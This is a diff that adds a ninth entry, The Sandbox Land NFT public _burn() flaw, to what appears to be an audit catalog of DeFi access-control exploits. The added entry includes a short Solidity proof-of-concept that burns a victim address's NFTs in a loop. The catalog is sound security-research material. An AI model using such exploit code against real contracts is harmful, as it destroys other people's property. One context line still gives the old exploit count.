@@ -13,7 +13,7 @@ attack_type:
   - Arbitrary swap-from via router
   - Fake factory injection for reward inflation
 source: DeFiHackLabs
-total_exploits_analyzed: 8
+total_exploits_analyzed: 9
 total_losses: "$3.3M+"
 affected_component:
   - Token contracts
@@ -63,6 +63,7 @@ This entry catalogs 8 access control bypass exploits from 2021-2022 sourced from
 6. **Unauthorized `transferFrom` via Public Entry** — Public function drains user approvals
 7. **Arbitrary `to` in Router Swap** — Router forces swaps from victim addresses
 8. **Fake Factory Injection** — User-supplied factory inflates swap mining rewards
+9. **Public NFT `_burn()`** — Anyone destroys any user's NFTs
 
 ---
 
@@ -386,6 +387,37 @@ function testExploit() public {
 
 ---
 
+### Pattern 9: Public NFT _burn() Allows Arbitrary Token Destruction
+
+**Severity**: 🔴 CRITICAL | **Loss**: NFT asset destruction | **Protocol**: The Sandbox Land | **Chain**: Ethereum
+
+The Sandbox Land NFT contract exposed a `_burn()` function as public, allowing anyone to burn NFTs from any address. Unlike ERC20 burns (Pattern 2), this directly destroys non-fungible property with no price manipulation needed.
+
+```solidity
+// @audit-issue Public _burn() — anyone can destroy any user's NFTs
+// @PoC: DeFiHackLabs/src/test/2022-02/Sandbox_exp.sol
+interface ILand {
+    function _burn(address from, address owner, uint256 id) external;
+    function _numNFTPerAddress(address owner) external view returns (uint256);
+}
+
+function testExploit() public {
+    address victim = 0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C;
+
+    // @audit Victim owns 2762 Land NFTs
+    // _burn function is PUBLIC — no access control
+    for (uint256 i = 0; i < 100; i++) {
+        // @audit Burns victim's NFTs one at a time — no authorization check
+        Land._burn(victim, victim, 3738);
+    }
+    // @audit 100 NFTs destroyed from victim. Could burn all 2762.
+}
+```
+
+**Reference**: [DeFiHackLabs/src/test/2022-02/Sandbox_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-02/Sandbox_exp.sol) | Block: 14,163,041
+
+---
+
 ## Impact Analysis
 
 | Protocol | Date | Loss | Root Cause | Chain |
@@ -398,6 +430,7 @@ function testExploit() public {
 | GYMNetwork | Jul 2023 | Variable | Router swaps from arbitrary address | BSC |
 | BabySwap | Oct 2022 | BABY tokens | Fake factory injection | BSC |
 | Uerii | Oct 2022 | ~$2.5K | Public mint() | Ethereum |
+| The Sandbox | Feb 2022 | NFT destruction | Public _burn() on Land NFTs | Ethereum |
 
 **Aggregate**: Over $3.3M in confirmed losses from access control failures.
 
@@ -580,9 +613,10 @@ INV-AC-008: No function should allow moving tokens from address X based solely o
 | GYMNetwork | Jul 2023 | Variable | Block 30,448,986 |
 | BabySwap | Oct 2022 | BABY rewards | Block 21,811,979 |
 | Uerii | Oct 2022 | ~$2.5K | Block 15,767,837 |
+| The Sandbox | Feb 2022 | NFT destruction | Block 14,163,041 |
 
 ---
 
 ## Keywords
 
-access_control, missing_modifier, onlyOwner, public_burn, public_mint, unauthorized_withdrawal, proxy_initialization, reinitializer, erc4626_redeem, approval_abuse, transferFrom_exploit, fake_factory, reward_inflation, governance_takeover, delegateStake, voting_power_fabrication, router_exploit, swap_from_arbitrary_address, defihacklabs, FlippazOne, ShadowFi, Uerii, Audius, ReaperFarm, ULME, GYMNetwork, BabySwap
+access_control, missing_modifier, onlyOwner, public_burn, public_mint, unauthorized_withdrawal, proxy_initialization, reinitializer, erc4626_redeem, approval_abuse, transferFrom_exploit, fake_factory, reward_inflation, governance_takeover, delegateStake, voting_power_fabrication, router_exploit, swap_from_arbitrary_address, nft_burn, Land_NFT, Sandbox, defihacklabs, FlippazOne, ShadowFi, Uerii, Audius, ReaperFarm, ULME, GYMNetwork, BabySwap
